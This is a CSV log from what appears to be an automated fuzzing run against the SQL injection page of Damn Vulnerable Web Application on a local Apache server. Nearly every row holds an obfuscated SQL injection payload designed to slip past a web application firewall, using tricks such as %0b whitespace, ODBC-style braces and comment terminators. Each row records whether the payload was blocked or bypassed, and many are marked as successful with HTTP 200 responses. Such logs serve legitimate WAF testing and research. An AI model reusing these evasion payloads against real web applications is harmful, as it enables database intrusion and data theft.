Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@=1.%0bor%0bnot+{x+(select%0b1)}=1=%0b(not+true)%23,Bypassed,No,None,Invalid,0.0217,72.53,No,500,
0'<@!=1%0bor+!+{`if`+1}=1=+(not+1)+||%27,Bypassed,No,None,Invalid,0.0167,72.53,No,500,
0'<@=1.%0b||+not+{x+(select%0b1)}=1=+(not%7efalse)+or',Bypassed,No,None,Invalid,0.0171,72.53,No,500,
0%27<@!=.1+||+not%0b1=+(not+{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0233,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||%0bnot%0b{a%0b1}=1=%0b(not%0b{a+1}=1)+||%27,Bypassed,No,None,Invalid,0.03,72.53,No,500,
0'<@!=.1+or+not+{`if`%0b1}=1=+(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Invalid,0.062,72.53,No,500,
0'<@=.1+or+not+true=%0b(!%0b{x%0b(select+1)}=1)%23,Bypassed,No,None,Invalid,0.0385,72.53,No,500,
0%27<@=.1+||+!+{a%0b1}=1=+(not%0b{`if`+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.029,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+false=+(not+{`if`%0b1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.033,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+not+{x%0b(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0459,72.53,No,500,
0'<@=1.+||+!~false=+(not~0)+||%27,Blocked,No,None,Invalid,0.015,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0b||+not%7e0=+(not%0b{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0315,72.53,No,500,
0'<@!=.1+or+!%0b{a+1}=1=+(not%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0357,72.53,No,500,
0'<@!=1.+or+!+{`if`+1}=1=+(not+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0388,72.53,No,500,
0'<@=.1%0b||+not+{x+(select+1)}=1=%0b(!+{a+1}=1)%0b||',Bypassed,No,None,Invalid,0.037,72.53,No,500,
0'<@=1.+||+not%7efalse=%0b(not%0b{a+1}=1)--%0b,Bypassed,No,None,Invalid,0.033,72.53,No,500,
0'or+!@<@+or%0bnot%0b{x%0b(select+1)}=1=+(!+{`if`+1}=1)+or%27,Blocked,No,None,Invalid,0.0284,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||+!+{x+(select%0b1)}=1=%0b(!+{x+(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0303,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!%0b{x%0b(select+1)}=1=+(not+{a+1}=1)+||',Bypassed,No,None,Invalid,0.0247,72.53,No,500,
0'<@=1%0b||+!%7e0=+(!+{a+1}=1)+or%27,Bypassed,No,None,Invalid,0.02,72.53,No,500,
0'<@!=1+or%0bnot+{x+(select+1)}=1=+(!%0b{`if`+1}=1)%0bor',Blocked,No,None,Invalid,0.0177,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor+{x+(select+1)}=1%0blike+{`if`+1}=1+||',Bypassed,No,None,Invalid,0.0087,72.53,No,500,
0'<@=1+or+not+{x%0b(select+1)}=1=%0b(not%7efalse)+or%27,Bypassed,No,None,Invalid,0.0228,72.53,No,500,
0%27||+@<@.+or+not+1=%0b(not%0b{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0194,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor%0bnot+{a+1}=1=+(!~0)+||%27,Bypassed,No,None,Invalid,0.0192,72.53,No,500,
0'<@=1+||+not%0btrue=%0b(!~0)+or',Bypassed,No,None,Invalid,0.0223,72.53,No,500,
0%27<@!=1.+||+!+{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0396,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||%0b{`if`+1}=1+like+{x%0b(select%0b1)}=1+||%27,Bypassed,No,None,Invalid,0.0206,72.53,No,500,
0'<@=1.+||+not%0b{x%0b(select+1)}=1=+(not+true)+or',Bypassed,No,None,Invalid,0.0235,72.53,No,500,
0'<@=1.+||%0b{`if`%0b1}=1+like%0b{a%0b1}=1+or%27,Bypassed,No,None,Invalid,0.028,72.53,No,500,
0%27<@=1.%0b||+0=+(!+{x+(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0275,72.53,No,500,
0'<@!=.1%0b||+!+{a+1}=1=+(!~false)+||%27,Bypassed,No,None,Invalid,0.0431,72.53,No,500,
0'<@=.1%0bor+!%0b{a%0b1}=1=%0b(not%0btrue)%23,Bypassed,No,None,Invalid,0.0424,72.53,No,500,
0'<@!=.1+||%0b!%0btrue=+(!%0btrue)+||',Blocked,No,None,Invalid,0.031,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor%0b!%0b{a+1}=1=%0b(not+{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.0242,72.53,No,500,
0%27<@=1+||+not%0b{x+(select+1)}=1=%0b(not%0b1)%0bor',Bypassed,No,None,Invalid,0.0378,72.62,No,500,
0%27||+@<@.+||+!%0b{x+(select%0b1)}=1=+(!+{`if`%0b1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0227,72.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+1<@+or+not+{x+(select%0b1)}=1=+(not+{a+1}=1)%0bor%27,Blocked,No,None,Invalid,0.0172,72.28,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27||+@<@.+||+not+{`if`%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0263,72.28,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+!%0btrue=+(not%0b{x+(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0434,72.28,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0bnot%0b{a%0b1}=1=%0b(!+{`if`+1}=1)%0bor',Bypassed,No,None,Invalid,0.0323,72.28,No,500,
0'<@!=.1+or%0bnot%7e0=+(!+true)+||%27,Blocked,No,None,Invalid,0.0274,72.28,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or+!%0b{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0323,72.28,No,500,
0'<@!=1+or+not%0b{x+(select%0b1)}=1=+(not+{a+1}=1)--+,Bypassed,No,None,Invalid,0.024,72.28,No,500,
0'<@=1.+or+not+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Invalid,0.0312,72.28,No,500,
0'<@=1%0bor+!+{x%0b(select%0b1)}=1=%0b(!+{x+(select+1)}=1)--%0b,Bypassed,No,None,Invalid,0.0386,72.4,No,500,
0'<@!=1+or+{`if`+1}=1+like+{x%0b(select%0b1)}=1%0b||',Bypassed,No,None,Invalid,0.0617,72.53,No,500,
0%27<@!=1.%0bor+!+{a+1}=1=+(!%0btrue)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0259,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+not%0b{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Invalid,0.0211,72.53,No,500,
0%27<@=1+or+{x+(select+1)}=1+like+{x+(select%0b1)}=1%23,Blocked,No,None,Invalid,0.0101,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or+!%0b{x%0b(select%0b1)}=1=+(!+{`if`%0b1}=1)%0bor',Bypassed,No,None,Invalid,0.0453,72.53,No,500,
0%27<@!=1+or+not+{a+1}=1=+(not+{`if`+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0465,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||%0b@<@.+||+!%0b{x+(select%0b1)}=1=%0b(!%0b{x%0b(select%0b1)}=1)+or,Bypassed,Yes,Yes (unionAtk),Invalid,0.022,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||%0b!%0btrue=+(not%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0256,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||+not~0=%0b(!+{`if`%0b1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0256,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+@<@.+||+not+{a+1}=1=+(!+{x+(select+1)}=1)+or%27,Blocked,No,None,Invalid,0.0142,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1%0b||%0bnot+{`if`+1}=1=+(!%7efalse)+||',Bypassed,No,None,Invalid,0.0364,72.53,No,500,
0'<@!=1.+||+!~false=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.0166,72.53,No,500,
0'<@=.1%0b||%0b!%0b{x%0b(select%0b1)}=1=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.0693,72.53,No,500,
0%27<@=1%0b||+!%0b{`if`+1}=1=%0b(not%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0255,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+not+{a+1}=1=%0b(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Invalid,0.0317,72.53,No,500,
0%27<@!=1.%0b||+not+{x%0b(select%0b1)}=1=%0b(not+{`if`%0b1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.025,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+!%0b{x+(select+1)}=1=+(!+{x+(select+1)}=1)--%0b,Bypassed,No,None,Invalid,0.0233,72.53,No,500,
0%27<@=1.+or+not+{x+(select+1)}=1=%0b(not%0b{a+1}=1)+||%27,Blocked,No,None,Invalid,0.0363,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor%0b{x%0b(select+1)}=1+like%0b{x+(select%0b1)}=1%0b||',Bypassed,No,None,Invalid,0.0241,72.53,No,500,
0%27or%0b!@<@.%0b||%0bnot%0b{a%0b1}=1=+(not%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0178,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or%0b!@<@%0b||+not%0b{`if`+1}=1=%0b(not+1)%0bor%27,Bypassed,No,None,Invalid,0.0453,72.53,No,500,
0%27<@!=.1+||+not%0b{`if`%0b1}=1=+(!+{a%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.023,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+not+{a%0b1}=1=%0b(!%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0188,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor+!+1=+(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0289,72.53,No,500,
0%27<@!=.1+or%0b!%0b1=+(!%7efalse)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0161,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
